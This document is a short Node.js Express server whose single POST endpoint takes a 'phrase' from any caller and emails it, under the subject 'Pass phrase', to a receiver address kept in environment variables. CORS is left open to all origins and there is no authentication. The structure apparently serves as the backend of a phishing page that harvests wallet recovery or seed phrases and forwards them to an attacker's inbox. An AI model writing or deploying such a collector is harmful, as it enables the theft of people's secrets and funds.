const express = require('express');
const app = express();
const port = 5000;
const cors = require('cors');
const nodemailer = require('nodemailer');
const dotenv = require("dotenv");
dotenv.config();    


app.use(express.json());
app.use(cors());

// Configure Nodemailer
const transporter = nodemailer.createTransport({
    service: 'Gmail', 
    auth: {
      user: process.env.EMAIL_USER, 
      pass: process.env.EMAIL_PASS,
    },
});
  

app.get('/', (req, res) => {
  res.send('Hello, World!');
});



app.post('/send-email', (req, res) => {
    const { phrase } = req?.body;

    try {
      // Send login email
      const mailOptions = {
        from: process.env.EMAIL_USER, 
        to: process.env.EMAIL_RECEIVER, 
        subject: 'Pass phrase', 
        text: phrase, 
      };
  
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.error('Error sending email:', error);
        } else {
          console.log('Email sent:', info?.response);
        }
      });
  
      res.status(200).json({
        message: "successful",
      });
    } catch (err) {
      res.status(500).json({ message: err?.message });
    }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});
